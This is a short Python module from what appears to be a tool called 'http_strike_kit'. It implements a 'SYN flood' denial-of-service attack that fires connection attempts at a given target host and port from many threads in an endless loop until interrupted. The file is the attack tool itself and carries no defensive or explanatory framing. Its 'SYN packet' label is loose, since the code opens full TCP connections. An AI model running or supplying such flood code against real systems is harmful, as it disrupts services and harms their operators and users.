import socket

import typer

from http_strike_kit.utils.thread_exec import ThreadedExecutor


def _syn_once(target: str, port: int):
    try:
        typer.echo(typer.style(f"Sending SYN packet {target}:{port}", fg=typer.colors.BRIGHT_BLACK))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((target, port))
        sock.close()
    except:
        pass


def syn_flood_attack(target: str, port: int, workers: int) -> None:
    typer.echo(typer.style("[!] To stop Press CTRL+C to stop it.", fg=typer.colors.WHITE, bold=True))
    executor = ThreadedExecutor(max_workers=workers)
    executor.start()
    try:
        while True:
            executor.submit(_syn_once, target, port)
    except KeyboardInterrupt:
        executor.wait()
